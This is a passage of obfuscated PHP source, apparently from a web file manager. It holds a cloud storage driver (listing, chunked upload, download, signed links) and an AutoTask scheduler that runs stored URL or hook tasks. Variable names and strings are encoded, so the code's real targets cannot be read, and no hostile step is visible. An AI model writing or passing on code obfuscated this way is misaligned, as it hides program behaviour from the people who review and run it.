$æé´©ğ[$ïü„Ùàı[85]] = 0; $æé´©ğ[$ïü„Ùàı[202]] = $æé´©ğ[$ïü„Ùàı[203]] = !0; if (empty($˜£¨ø¯)) { $˜£¨ø¯ = $this->objectMeta($³´û÷Ö); if (!$˜£¨ø¯) { return $æé´©ğ; } } $æé´©ğ[$ïü„Ùàı[201]] = intval($˜£¨ø¯[$ïü„Ùàı[1470]]); $æé´©ğ[$ïü„Ùàı[85]] = intval($˜£¨ø¯[$ïü„Ùàı[1471]]); $æé´©ğ[$ïü„Ùàı[76]] = $˜£¨ø¯[$ïü„Ùàı[76]]; return $æé´©ğ; } public function folderInfo($ñºœÍ›ş, $ƒø¤™Ğ = false) { $¢Ì—Ïˆ× =& $_SERVER[¡“ËÌ§œ]; $«™¾Öó = array($¢Ì—Ïˆ×[32] => $this->pathThis($ñºœÍ›ş), $¢Ì—Ïˆ×[84] => $this->getPathOuter($¢Ì—Ïˆ×[8] . $ñºœÍ›ş), $¢Ì—Ïˆ×[33] => $¢Ì—Ïˆ×[75]); if ($ƒø¤™Ğ) { return $«™¾Öó; } $«™¾Öó[$¢Ì—Ïˆ×[201]] = $«™¾Öó[$¢Ì—Ïˆ×[85]] = 0; $«™¾Öó[$¢Ì—Ïˆ×[202]] = $«™¾Öó[$¢Ì—Ïˆ×[203]] = !0; if (empty($úû©õÂ°)) { $úû©õÂ° = $this->objectMeta($ñºœÍ›ş); if (!$úû©õÂ°) { return $«™¾Öó; } } $«™¾Öó[$¢Ì—Ïˆ×[201]] = intval($úû©õÂ°[$¢Ì—Ïˆ×[1470]]); $«™¾Öó[$¢Ì—Ïˆ×[85]] = intval($úû©õÂ°[$¢Ì—Ïˆ×[1471]]); return $«™¾Öó; } private function listObjs($˜†´Î“¯, $¨ª³ù = 0, $ÏÔ©Œ®± = 1000) { $ı¥ˆ™Àà =& $_SERVER[¡“ËÌ§œ]; $’Ï£ú½Å = array($ı¥ˆ™Àà[1472], $ı¥ˆ™Àà[1473] . $ÏÔ©Œ®±); if ($¨ª³ù) { $’Ï£ú½Å[] = $ı¥ˆ™Àà[1474] . $¨ª³ù; } $–œûö¡ = $this->ussRequest($˜†´Î“¯, $ı¥ˆ™Àà[230], !1, $’Ï£ú½Å); return !$–œûö¡[$ı¥ˆ™Àà[1232]] ? !1 : $–œûö¡[$ı¥ˆ™Àà[1222]]; } private function fileList($Ìšéé¡×, &$ı¶ğ¥‘á, &$èƒ™ı©Ä, $áî¿â‰ = false) { $à˜³õ¼Á =& $_SERVER[¡“ËÌ§œ]; $Ã…•±ÛÈ = $à˜³õ¼Á[12]; $±·­¿ß„ = 1000; $ºüĞ•ƒç = rtrim($Ìšéé¡×, $à˜³õ¼Á[8]) . $à˜³õ¼Á[8]; while (!0) { check_abort(); $ìÖˆÂÜš = $this->listObjs($Ìšéé¡×, $Ã…•±ÛÈ, $±·­¿ß„); if (!$ìÖˆÂÜš) { return !1; } $Ã…•±ÛÈ = isset($ìÖˆÂÜš[$à˜³õ¼Á[1475]]) ? $ìÖˆÂÜš[$à˜³õ¼Á[1475]] : $à˜³õ¼Á[12]; $€õºåš¡ = isset($ìÖˆÂÜš[$à˜³õ¼Á[1476]]) ? $ìÖˆÂÜš[$à˜³õ¼Á[1476]] : array(); foreach ($€õºåš¡ as $ü‹€Ó÷†) { $‡ş×éö¹ = $ü‹€Ó÷†[$à˜³õ¼Á[33]] == $à˜³õ¼Á[75] ? !0 : !1; $Å³’‚ô¨ = ltrim($ºüĞ•ƒç . $ü‹€Ó÷†[$à˜³õ¼Á[32]], $à˜³õ¼Á[8]) . ($‡ş×éö¹ ? $à˜³õ¼Á[8] : $à˜³õ¼Á[12]); $ŞÛÄ³Ø = array($à˜³õ¼Á[32] => $Å³’‚ô¨, $à˜³õ¼Á[33] => $‡ş×éö¹ ? $à˜³õ¼Á[75] : $à˜³õ¼Á[200], $à˜³õ¼Á[76] => $ü‹€Ó÷†[$à˜³õ¼Á[366]], $à˜³õ¼Á[1471] => $ü‹€Ó÷†[$à˜³õ¼Á[1477]]); $this->cacheMethodInfoSet($Å³’‚ô¨, $‡ş×éö¹, $ŞÛÄ³Ø); if ($‡ş×éö¹) { $ı¶ğ¥‘á[] = $Å³’‚ô¨; if ($áî¿â‰) { $this->fileList($Å³’‚ô¨, $ı¶ğ¥‘á, $èƒ™ı©Ä, $áî¿â‰); } continue; } $èƒ™ı©Ä[] = $ŞÛÄ³Ø; } if (count($€õºåš¡) < $±·­¿ß„) { break; } } $this->cacheMethodInfoSet($Ìšéé¡×, !0); } public function listPath($ŠƒÄé£„, $ä³²É¼ò = false) { $¼¿„å› =& $_SERVER[¡“ËÌ§œ]; $ª¾Êò¤å = $ù»’ğïú = array(); $this->fileList($ŠƒÄé£„, $ª¾Êò¤å, $ù»’ğïú); foreach ($ª¾Êò¤å as $ÖÅ–Ë¢› => $ÑÚ®ø«) { $ª¾Êò¤å[$ÖÅ–Ë¢›] = $this->folderInfo($ÑÚ®ø«, $ä³²É¼ò); } foreach ($ù»’ğïú as $ÖÅ–Ë¢› => $ÑÚ®ø«) { $ù»’ğïú[$ÖÅ–Ë¢›] = $this->fileInfo($ÑÚ®ø«[$¼¿„å›[32]], $ä³²É¼ò, $ÑÚ®ø«); } return array($¼¿„å›[82] => $ª¾Êò¤å, $¼¿„å›[83] => $ù»’ğïú); } public function has($üšããØ, $÷›Š”Ö¥ = false, $»ÔÍÁ‚ş = true) { $ù×ˆèì =& $_SERVER[¡“ËÌ§œ]; $¸¡Ïüù¬ = $ù×ˆèì[12]; $®şÂ‡’· = 500; $°•ñôÊé = 0; $ÇÚï¢¿ë = 0; $–°ıÌ³Ÿ = rtrim($üšããØ, $ù×ˆèì[8]) . $ù×ˆèì[8]; while (!0) { check_abort(); $Öú˜Ş®ğ = $this->listObjs($üšããØ, $¸¡Ïüù¬, $®şÂ‡’·); if (!$Öú˜Ş®ğ) { return !1; } $¸¡Ïüù¬ = isset($Öú˜Ş®ğ[$ù×ˆèì[1475]]) ? $Öú˜Ş®ğ[$ù×ˆèì[1475]] : $ù×ˆèì[12]; $ºŠÒ§Å„ = isset($Öú˜Ş®ğ[$ù×ˆèì[1476]]) ? $Öú˜Ş®ğ[$ù×ˆèì[1476]] : array(); if (empty($ºŠÒ§Å„)) { break; } $®ªØ¸Ù« = array_filter($ºŠÒ§Å„, function ($ğ™ÃîÂÂ) { $Éñ°âê =& $_SERVER[¡“ËÌ§œ]; return $ğ™ÃîÂÂ[$Éñ°âê[33]] == $Éñ°âê[75]; }); $µÇ…ªë« = count($ºŠÒ§Å„); $®ªØ¸Ù« = count($®ªØ¸Ù«); $´¼õæ = $µÇ…ªë« - $®ªØ¸Ù«; if ($÷›Š”Ö¥) { $ÇÚï¢¿ë += $®ªØ¸Ù«; $°•ñôÊé += $´¼õæ; if ($µÇ…ªë« < $®şÂ‡’·) { break; } continue; } if ($»ÔÍÁ‚ş) { if ($´¼õæ) { return !0; } } else { if ($®ªØ¸Ù«) { return !0; } } if ($µÇ…ªë« < $®şÂ‡’·) { break; } } if ($÷›Š”Ö¥) { return array($ù×ˆèì[207] => $°•ñôÊé, $ù×ˆèì[208] => $ÇÚï¢¿ë); } return !1; } public function listAll($¿–¢§) { $¯Ó‘ÆÙË =& $_SERVER[¡“ËÌ§œ]; $ ‰è‹ı = $¶Ô‡šÕ = array(); $this->fileList($¿–¢§, $ ‰è‹ı, $¶Ô‡šÕ, !0); $×ö€§ = array_to_keyvalue($¶Ô‡šÕ, $¯Ó‘ÆÙË[32]); foreach ($ ‰è‹ı as $şâÄÍ Ş) { if (is_string($şâÄÍ Ş)) { $×ö€§[$şâÄÍ Ş] = array($¯Ó‘ÆÙË[76] => 0); } } return $this->listAllFiles($¿–¢§, $×ö€§); } public function canRead($ßÀÇÌ†û) { return $this->exist($ßÀÇÌ†û) ? !0 : !1; } public function canWrite($×±Ï¿²) { return $this->exist($×±Ï¿²) ? !0 : !1; } public function getContent($Ğ¡ñ®ú†) { return $this->fileSubstr($Ğ¡ñ®ú†, 0, -1); } public function setContent($«¶ÂÓÅ, $ÕìôÍÂ = '') { $†ùéÍó =& $_SERVER[¡“ËÌ§œ]; if (!$ÕìôÍÂ) { $ÎŠØõìÛ = $this->ussRequest($«¶ÂÓÅ, $†ùéÍó[226]); return $ÎŠØõìÛ[$†ùéÍó[1232]]; } $äü¶ñ“¨ = $this->tempFile($this->pathThis($«¶ÂÓÅ)); file_put_contents($äü¶ñ“¨, $ÕìôÍÂ); if ($this->upload($«¶ÂÓÅ, $äü¶ñ“¨)) { $this->tempFileRemve($äü¶ñ“¨); return !0; } return !1; } public function fileSubstr($§è˜£äÙ, $åŒı¹”, $ğ„©ıÚ«) { $£œŠ‰Ò¡ =& $_SERVER[¡“ËÌ§œ]; if (!($Û‰ÇúÎ§ = $this->link($§è˜£äÙ))) { return !1; } $‘ÄŸ°˜ù = !1; if ($ğ„©ıÚ« > 0) { $ŠÛÉÇ©“ = $åŒı¹” + $ğ„©ıÚ« - 1; $‘ÄŸ°˜ù = array($£œŠ‰Ò¡[1438] . $åŒı¹” . $£œŠ‰Ò¡[415] . $ŠÛÉÇ©“); } $‰¨ŸìØ = url_request($Û‰ÇúÎ§, $£œŠ‰Ò¡[230], !1, $‘ÄŸ°˜ù); return $‰¨ŸìØ[$£œŠ‰Ò¡[770]] ? $‰¨ŸìØ[$£œŠ‰Ò¡[1222]] : !1; } public function upload($»³öÙÒ, $æ‰¢Å¾ã, $áïëª™ñ = false, $Û·¼Ì±¸ = REPEAT_REPLACE) { $‹‰×¥¥Ÿ =& $_SERVER[¡“ËÌ§œ]; $Ö“¢Å­Ü = IO::size($æ‰¢Å¾ã); if ($Ö“¢Å­Ü <= 1024 * 1024 * 200) { $áÙ±°¡Õ = array($‹‰×¥¥Ÿ[1478] . $æ‰¢Å¾ã); $Âµûªƒæ = $this->ussRequest($»³öÙÒ, $‹‰×¥¥Ÿ[228], $áÙ±°¡Õ); return $Âµûªƒæ[$‹‰×¥¥Ÿ[1232]] ? $this->getPathOuter($»³öÙÒ) : !1; } $¸ÍÛÁ·Ş = 1024 * 1024 * 10; $Íµ–—ú = array($‹‰×¥¥Ÿ[1479], $‹‰×¥¥Ÿ[1480] . $Ö“¢Å­Ü, $‹‰×¥¥Ÿ[1481], $‹‰×¥¥Ÿ[1482] . $¸ÍÛÁ·Ş); $Âµûªƒæ = $this->ussRequest($»³öÙÒ, $‹‰×¥¥Ÿ[228], !1, $Íµ–—ú); if (!$Âµûªƒæ[$‹‰×¥¥Ÿ[1232]]) { return !1; } $Ì¼•Úâ = $Âµûªƒæ[$‹‰×¥¥Ÿ[1222]]; $¼”çó¬ƒ = 0; $£Ş§Ö„„ = $Ì¼•Úâ[$‹‰×¥¥Ÿ[1483]]; $ÅğÕ‹ = fopen($æ‰¢Å¾ã, $‹‰×¥¥Ÿ[1387]); if (!$ÅğÕ‹) { return !1; } do { $‘•ÈœÕ = $Ì¼•Úâ[$‹‰×¥¥Ÿ[1484]]; fseek_64($ÅğÕ‹, $¼”çó¬ƒ); $°Ù¯É‡ş = fread($ÅğÕ‹, $‘•ÈœÕ); $º÷Ñü†¨ = 0; do { $º÷Ñü†¨++; $Ì¼•Úâ = $this->uploadPart($»³öÙÒ, $Ì¼•Úâ, $°Ù¯É‡ş); } while (!$Ì¼•Úâ && $º÷Ñü†¨ < 3); if (!$Ì¼•Úâ) { return !1; } $£Ş§Ö„„ = $Ì¼•Úâ[$‹‰×¥¥Ÿ[1483]]; $¼”çó¬ƒ += $‘•ÈœÕ; } while ($£Ş§Ö„„ != -1); fclose($ÅğÕ‹); $Íµ–—ú = array($‹‰×¥¥Ÿ[1485], $‹‰×¥¥Ÿ[1486] . $Ì¼•Úâ[$‹‰×¥¥Ÿ[1487]], $‹‰×¥¥Ÿ[1481]); $Âµûªƒæ = $this->ussRequest($»³öÙÒ, $‹‰×¥¥Ÿ[228], !1, $Íµ–—ú); return $Âµûªƒæ[$‹‰×¥¥Ÿ[1232]] ? $this->getPathOuter($şå§·Êí) : !1; } private function uploadPart($­‹Å‹ü’, $Úóœƒ, &$­ÇÔ®ãš) { $Ó¸ñ±¶Å =& $_SERVER[¡“ËÌ§œ]; $ØÇâÂæë = array($Ó¸ñ±¶Å[1488], $Ó¸ñ±¶Å[1486] . $Úóœƒ[$Ó¸ñ±¶Å[1487]], $Ó¸ñ±¶Å[1489] . $Úóœƒ[$Ó¸ñ±¶Å[1483]], $Ó¸ñ±¶Å[142] . $Úóœƒ[$Ó¸ñ±¶Å[1484]]); $üõ¯§¿‘ = $this->ussRequest($­‹Å‹ü’, $Ó¸ñ±¶Å[228], $­ÇÔ®ãš, $ØÇâÂæë); return !$üõ¯§¿‘[$Ó¸ñ±¶Å[1232]] ? $üõ¯§¿‘[$Ó¸ñ±¶Å[1232]] : $üõ¯§¿‘[$Ó¸ñ±¶Å[1222]]; } public function uploadFormData($ºüùˆ­, $ï£åÒ…ı = 3600) { return $this->uploadPolicy($ºüùˆ­, $ï£åÒ…ı); } public function multiUploadFormData($ÑıÊ²Ş•, $ıç™´ÀÕ = 3600) { $ ö¾»Å¸ =& $_SERVER[¡“ËÌ§œ]; $î™şÕÊØ = (int) $GLOBALS[$ ö¾»Å¸[7]][$ ö¾»Å¸[76]]; return $this->uploadPolicy($ÑıÊ²Ş•, $ıç™´ÀÕ, $î™şÕÊØ); } private function uploadPolicy($İ‘İ’…˜, $½°¦î¬± = 3600, $ø¡º†¶¨ = 0) { $’Å¯Ôè =& $_SERVER[¡“ËÌ§œ]; $Š™—À—ø = $’Å¯Ôè[8] . $this->bucket; $Àù½ùø = gmdate($’Å¯Ôè[1423]); $È†×îİß = array($’Å¯Ôè[1490] => $this->bucket, $’Å¯Ôè[1491] => $İ‘İ’…˜, $’Å¯Ôè[1492] => time() + $½°¦î¬±, $’Å¯Ôè[1493] => $Àù½ùø); if ($ø¡º†¶¨) { $È†×îİß[$’Å¯Ôè[1403]] = $ø¡º†¶¨; } $¨Ù¢—‹ø = base64_encode(json_encode($È†×îİß)); $¦™Èõê˜ = base64_encode(hash_hmac($’Å¯Ôè[1460], "\x50\117\123\124\46{$Š™—À—ø}\46{$Àù½ùø}\x26{$¨Ù¢—‹ø}", md5("{$this->userpass}"), !0)); $ù¾ªÍ‚š = array($’Å¯Ôè[261] => $¨Ù¢—‹ø, $’Å¯Ôè[1494] => "\x55\x50\x59\125\116\x20{$this->username}\72{$¦™Èõê˜}", $’Å¯Ôè[182] => $this->endpoint . $Š™—À—ø); return $ù¾ªÍ‚š; } public function download($¡†ãÇƒ, $Ôã¶Õ¥È) { $«×Æ±½ = IO::getPathInner(IO::mkfile($Ôã¶Õ¥È)); if (!($¦âª´ú = $this->link($¡†ãÇƒ))) { return !1; } $’Ô—¨‚ö = 0; $¢Îó’® = 1024 * 200; $×­ƒãÛ = fopen($«×Æ±½, $_SERVER[¡“ËÌ§œ][1444]); while (!0) { $şÔ¨µ‡ = $this->fileSubstr($¡†ãÇƒ, $’Ô—¨‚ö, $¢Îó’®); if ($şÔ¨µ‡ === !1) { return !1; } fwrite($×­ƒãÛ, $şÔ¨µ‡); $’Ô—¨‚ö += $¢Îó’®; if (strlen($şÔ¨µ‡) < $¢Îó’®) { break; } } fclose($×­ƒãÛ); return $Ôã¶Õ¥È; } public function link($ãÓ’¦ˆö, $¹êÁÅ÷à = array()) { $ƒïÍĞÍ§ =& $_SERVER[¡“ËÌ§œ]; $ãÓ’¦ˆö = trim($ãÓ’¦ˆö, $ƒïÍĞÍ§[8]); if (!empty($this->token)) { $ÙĞ¥ ÔÏ = strtotime(date($ƒïÍĞÍ§[1495])); $°®Ñ´®Â = substr(md5($this->token . $ƒïÍĞÍ§[313] . $ÙĞ¥ ÔÏ . $ƒïÍĞÍ§[1496] . $ãÓ’¦ˆö), 12, 8) . $ÙĞ¥ ÔÏ; $¹êÁÅ÷à[] = $ƒïÍĞÍ§[1497] . $°®Ñ´®Â; } $®õÛ¹Éº = !empty($¹êÁÅ÷à) ? $ƒïÍĞÍ§[73] . implode($ƒïÍĞÍ§[313], $¹êÁÅ÷à) : $ƒïÍĞÍ§[12]; return $this->getHost() . $ƒïÍĞÍ§[8] . $ãÓ’¦ˆö . $®õÛ¹Éº; } public function fileOut($ËÇÁçÇ, $º‘˜²âÈ = false, $œª÷¡ºÑ = false, $öç£‹Êû = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ËÇÁçÇ, $º‘˜²âÈ, $œª÷¡ºÑ, $öç£‹Êû); } if (!$œª÷¡ºÑ) { $œª÷¡ºÑ = $this->pathThis($ËÇÁçÇ); } $¼„æĞ¶ = $º‘˜²âÈ ? array($_SERVER[¡“ËÌ§œ][1498] . rawurlencode($œª÷¡ºÑ)) : array(); $·‘é‚ˆÆ = $this->link($ËÇÁçÇ, $¼„æĞ¶); $this->fileOutLink($·‘é‚ˆÆ); } public function fileOutServer($™àõŒË¡, $Îîäê³Ñ = false, $œ¤ù”îŸ = false, $ºÁÅ Ÿø = '') { parent::fileOut($™àõŒË¡, $Îîäê³Ñ, $œ¤ù”îŸ, $ºÁÅ Ÿø); } public function fileOutImage($ïüºò¸·, $…‹Á¢ = 250) { $¬¬ü¼Û = $this->link($ïüºò¸· . $_SERVER[¡“ËÌ§œ][1499] . $…‹Á¢); $this->fileOutLink($¬¬ü¼Û); } public function fileOutImageServer($ëÄÄî®®, $áÔáìËÙ = 250) { parent::fileOutImage($ëÄÄî®®, $áÔáìËÙ); } public function hashMd5($±—éÀü) { $¥àšÄÇŸ =& $_SERVER[¡“ËÌ§œ]; $ºéş¾¨ó = $this->_objectMeta($±—éÀü); return isset($ºéş¾¨ó[$¥àšÄÇŸ[212]]) ? $ºéş¾¨ó[$¥àšÄÇŸ[212]] : !1; } public function size($ËÆïÚü·) { $ŠÒÆ¢û = $this->objectMeta($ËÆïÚü·); return $ŠÒÆ¢û ? $ŠÒÆ¢û[$_SERVER[¡“ËÌ§œ][76]] : 0; } public function info($­éÄ®ìŸ) { if ($this->isFolder($­éÄ®ìŸ)) { return $this->folderInfo($­éÄ®ìŸ); } else { if ($this->isFile($­éÄ®ìŸ)) { return $this->fileInfo($­éÄ®ìŸ); } } return !1; } public function exist($‚ÚÆ€ÖÆ) { return $this->isFile($‚ÚÆ€ÖÆ) || $this->isFolder($‚ÚÆ€ÖÆ); } public function isFile($áœôÜ) { return !$this->isFolder($áœôÜ) && $this->objectMeta($áœôÜ); } public function isFolder($³ıùü•) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][165], $³ıùü•); } protected function objectMeta($„”Úî) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][167], $„”Úî); } protected function _objectMeta($ÅÈÓò“) { $¡Ç†’Šğ =& $_SERVER[¡“ËÌ§œ]; if ($ÅÈÓò“ == $¡Ç†’Šğ[12] || $ÅÈÓò“ == $¡Ç†’Šğ[8]) { return array(); } $ĞÅ“¬ø = $this->ussRequest($ÅÈÓò“, $¡Ç†’Šğ[1500]); if (!$ĞÅ“¬ø[$¡Ç†’Šğ[1232]]) { return null; } $¤ÏĞòìÚ = isset($ĞÅ“¬ø[$¡Ç†’Šğ[1222]]) ? $ĞÅ“¬ø[$¡Ç†’Šğ[1222]] : array(); if (!isset($¤ÏĞòìÚ[$¡Ç†’Šğ[1501]])) { return null; } $Şæïõ = array($¡Ç†’Šğ[33] => isset($¤ÏĞòìÚ[$¡Ç†’Šğ[1501]]) ? $¤ÏĞòìÚ[$¡Ç†’Šğ[1501]] : null, $¡Ç†’Šğ[76] => isset($¤ÏĞòìÚ[$¡Ç†’Šğ[1502]]) ? $¤ÏĞòìÚ[$¡Ç†’Šğ[1502]] : null, $¡Ç†’Šğ[212] => isset($¤ÏĞòìÚ[$¡Ç†’Šğ[1503]]) ? $¤ÏĞòìÚ[$¡Ç†’Šğ[1503]] : null, $¡Ç†’Šğ[1470] => isset($¤ÏĞòìÚ[$¡Ç†’Šğ[1504]]) ? $¤ÏĞòìÚ[$¡Ç†’Šğ[1504]] : null); $Şæïõ[$¡Ç†’Šğ[1471]] = isset($¤ÏĞòìÚ[$¡Ç†’Šğ[1505]]) ? strtotime($¤ÏĞòìÚ[$¡Ç†’Šğ[1505]]) : $Şæïõ[$¡Ç†’Šğ[1470]]; return $Şæïõ; } protected function _isFolder($ÌÑİ™›Å) { $‰€Ş£¾û =& $_SERVER[¡“ËÌ§œ]; if ($ÌÑİ™›Å == $‰€Ş£¾û[12] || $ÌÑİ™›Å == $‰€Ş£¾û[8]) { return !0; } $¯ÓÔù´ = $this->_objectMeta($ÌÑİ™›Å); return isset($¯ÓÔù´[$‰€Ş£¾û[33]]) && $¯ÓÔù´[$‰€Ş£¾û[33]] == $‰€Ş£¾û[75] ? !0 : !1; } } goto AØ´ËçğÀä; bã˜‘³èà: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $éƒ´·®É =& $_SERVER[¡“ËÌ§œ]; if (self::valueGet($éƒ´·®É[770]) != $éƒ´·®É[88]) { return; } if (self::valueGet($éƒ´·®É[1618]) == $éƒ´·®É[88]) { $áÃÅÁÆ = self::valueGet($éƒ´·®É[1619]); if (time() - $áÃÅÁÆ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$éƒ´·®É[1620]] = 1; self::valueSet($éƒ´·®É[1618], $éƒ´·®É[88]); self::log($éƒ´·®É[1621] . ACTION . $éƒ´·®É[1622]); $_SERVER[$éƒ´·®É[1623]] = $éƒ´·®É[1624]; Session::$data = array(); Session::$sessionSign = $éƒ´·®É[12]; $GLOBALS[$éƒ´·®É[532]] = 1; Hook::bind($éƒ´·®É[1625], $éƒ´·®É[1626]); $ìÂÍ“¢÷ = 0; while (!0) { self::cacheClear(); if (self::valueGet($éƒ´·®É[770]) != $éƒ´·®É[88]) { self::valueSet($éƒ´·®É[1618], $éƒ´·®É[198]); self::log($éƒ´·®É[1627]); die; } $ÚÓˆèÈ¡ = time(); if ($ÚÓˆèÈ¡ - $ìÂÍ“¢÷ >= 60) { self::valueSet(array($éƒ´·®É[1618] => $éƒ´·®É[88], $éƒ´·®É[1619] => $ÚÓˆèÈ¡), !1); $ìÂÍ“¢÷ = $ÚÓˆèÈ¡; } if (!file_exists(USER_SYSTEM . $éƒ´·®É[1628])) { self::valueSet(array($éƒ´·®É[1618] => $éƒ´·®É[198], $éƒ´·®É[770] => $éƒ´·®É[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $Âı¢ù´÷ =& $_SERVER[¡“ËÌ§œ]; http_close(); self::valueSet($Âı¢ù´÷[770], $Âı¢ù´÷[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Âı¢ù´÷[1618] => $Âı¢ù´÷[198], $Âı¢ù´÷[770] => $Âı¢ù´÷[88]), !1); } public static function taskSwitch() { $‡˜İ¥Ÿ =& $_SERVER[¡“ËÌ§œ]; $¢ƒ¢ŒÑ‚ = self::valueGet($‡˜İ¥Ÿ[770]) == $‡˜İ¥Ÿ[88] ? $‡˜İ¥Ÿ[198] : $‡˜İ¥Ÿ[88]; self::valueSet($‡˜İ¥Ÿ[770], $¢ƒ¢ŒÑ‚); } public static function shutdownEvent() { $äúäÔÓ¬ =& $_SERVER[¡“ËÌ§œ]; self::valueSet($äúäÔÓ¬[1618], $äúäÔÓ¬[198]); self::log($äúäÔÓ¬[1629]); } public static function config($º±öÎ€Ç, $â×¿àš¹) { self::valueSet($_SERVER[¡“ËÌ§œ][770], $º±öÎ€Ç); } private static function taskRunAll() { $ÔıÇÎİ‰ =& $_SERVER[¡“ËÌ§œ]; $©ß‘”ÎĞ = timeFloat(); $ìØ¹“ó· = Model($ÔıÇÎİ‰[1630])->listData(); $¦´ÅÂÛ = count($ìØ¹“ó·); for ($èö®Ò¸ê = 0; $èö®Ò¸ê < $¦´ÅÂÛ; $èö®Ò¸ê++) { $Š––Ä¿ = $ìØ¹“ó·[$èö®Ò¸ê]; if (!$Š––Ä¿[$ÔıÇÎİ‰[437]] || $Š––Ä¿[$ÔıÇÎİ‰[1631]] != $ÔıÇÎİ‰[88]) { continue; } if (!self::taskTimeCheck($Š––Ä¿)) { continue; } self::taskRun($Š––Ä¿); } Hook::trigger($ÔıÇÎİ‰[1632]); self::taskQueueRun($©ß‘”ÎĞ); } private static function taskQueueRun($”á²õ‰Æ) { $á´äŸ = 10; while (!0) { $·‘Õ’é™ = TaskQueue::run(); if ($·‘Õ’é™ === !1) { break; } if (timeFloat() - $”á²õ‰Æ >= $á´äŸ) { break; } } } private static function taskTimeCheck($ğôØ’’³) { $ççèªÌ =& $_SERVER[¡“ËÌ§œ]; $…ı¿ôö» = json_decode($ğôØ’’³[$ççèªÌ[180]], !0); $»ÚßÏÅã = intval($ğôØ’’³[$ççèªÌ[1619]]); $Ï±¾†óĞ = strtotime($ççèªÌ[1633] . $…ı¿ôö»[$ççèªÌ[1634]] . $ççèªÌ[1635]) - strtotime($ççèªÌ[1636]); $Â‹¤…£ò = time() - strtotime(date($ççèªÌ[1637]) . $ççèªÌ[1638]); $û¥û¶øº = $Â‹¤…£ò >= $Ï±¾†óĞ && $Â‹¤…£ò <= $Ï±¾†óĞ + 3600; switch ($…ı¿ôö»[$ççèªÌ[33]]) { case $ççèªÌ[1639]: if (time() - $»ÚßÏÅã < 3600 * 24 * 30) { return !1; } if ($…ı¿ôö»[$ççèªÌ[1639]] == date($ççèªÌ[1640]) && $û¥û¶øº) { return !0; } break; case $ççèªÌ[1641]: if (time() - $»ÚßÏÅã < 3600 * 24 * 7) { return !1; } $È²¿Û¡Ù = date($ççèªÌ[1642]) == 0 ? 7 : date($ççèªÌ[1642]); if ($…ı¿ôö»[$ççèªÌ[1641]] == $È²¿Û¡Ù && $û¥û¶øº) { return !0; } break; case $ççèªÌ[1634]: if (time() - $»ÚßÏÅã < 3600 * 24) { return !1; } if ($û¥û¶øº) { return !0; } break; case $ççèªÌ[1643]: if (time() - $»ÚßÏÅã >= floatval($…ı¿ôö»[$ççèªÌ[1643]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¤†óú”© =& $_SERVER[¡“ËÌ§œ]; static $ÏƒÜâüÂ = 0; $ùÕ§§òÊ = 300; if (!$ÏƒÜâüÂ) { $ÏƒÜâüÂ = time(); } if (time() - $ÏƒÜâüÂ < $ùÕ§§òÊ) { return; } $ÏƒÜâüÂ = time(); $¬¨Ïßø¸ = Model($¤†óú”©[542])->db($¤†óú”©[12]); if ($¬¨Ïßø¸) { $¬¨Ïßø¸->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¤†óú”©[1644], $¤†óú”©[1645]); die; } } public static function taskRun($·›ç®Œ) { $¯İ‰‘Úâ =& $_SERVER[¡“ËÌ§œ]; self::log($¯İ‰‘Úâ[1646] . $·›ç®Œ[$¯İ‰‘Úâ[437]] . $¯İ‰‘Úâ[1647] . $·›ç®Œ[$¯İ‰‘Úâ[32]] . $¯İ‰‘Úâ[1648] . $·›ç®Œ[$¯İ‰‘Úâ[1649]]); Model($¯İ‰‘Úâ[1630])->run($·›ç®Œ[$¯İ‰‘Úâ[437]]); $¢à¯‹Ã¤ = timeFloat(); $ë¯•Óê = $¯İ‰‘Úâ[12]; switch ($·›ç®Œ[$¯İ‰‘Úâ[33]]) { case $¯İ‰‘Úâ[336]: $¢ÄëÜ = url_request($·›ç®Œ[$¯İ‰‘Úâ[1649]], $¯İ‰‘Úâ[230], !1, !1, !1, !1, 10); if ($¢ÄëÜ[$¯İ‰‘Úâ[770]]) { $ë¯•Óê = strlen($¢ÄëÜ[$¯İ‰‘Úâ[1222]]); } break; case $¯İ‰‘Úâ[229]: $ë¯•Óê = Hook::apply($·›ç®Œ[$¯İ‰‘Úâ[1649]]); default: break; } Model($¯İ‰‘Úâ[1650])->add(array($¯İ‰‘Úâ[1651] => $¯İ‰‘Úâ[12], $¯İ‰‘Úâ[1652] => $¯İ‰‘Úâ[198], $¯İ‰‘Úâ[33] => $¯İ‰‘Úâ[1653] . $·›ç®Œ[$¯İ‰‘Úâ[437]], $¯İ‰‘Úâ[1654] => json_encode(array($¯İ‰‘Úâ[32] => $·›ç®Œ[$¯İ‰‘Úâ[32]], $¯İ‰‘Úâ[1655] => timeFloat() - $¢à¯‹Ã¤, $¯İ‰‘Úâ[322] => $ë¯•Óê)))); $åöŠ¿ = $ë¯•Óê ? $¯İ‰‘Úâ[1656] . $ë¯•Óê : $¯İ‰‘Úâ[12]; self::log($¯İ‰‘Úâ[1657] . $·›ç®Œ[$¯İ‰‘Úâ[437]] . $¯İ‰‘Úâ[164] . $åöŠ¿); return !0; } public static function valueGet($¼’ÚÛ‚Í) { $à­ëá =& $_SERVER[¡“ËÌ§œ]; $¬ÔÊŸÌ = $à­ëá[1658]; $–¼éòäé = Model($à­ëá[473])->get($¼’ÚÛ‚Í, $¬ÔÊŸÌ); if (is_null($–¼éòäé)) { Model($à­ëá[473])->set($à­ëá[770], $à­ëá[88], $¬ÔÊŸÌ); Model($à­ëá[473])->set($à­ëá[1618], $à­ëá[198], $¬ÔÊŸÌ); $–¼éòäé = Model($à­ëá[473])->get($¼’ÚÛ‚Í, $¬ÔÊŸÌ); } return $–¼éòäé; } private static function valueSet($£Ä¸ë, $Ğ°´Èá×) { $ıšÊÂÅ =& $_SERVER[¡“ËÌ§œ]; $ê«Û›’ = $ıšÊÂÅ[1659]; CacheLock::lock($ê«Û›’); $í’óÓ‘› = Model($ıšÊÂÅ[473])->set($£Ä¸ë, $Ğ°´Èá×, $ıšÊÂÅ[1658]); CacheLock::unlock($ê«Û›’); return $í’óÓ‘›; } protected static function 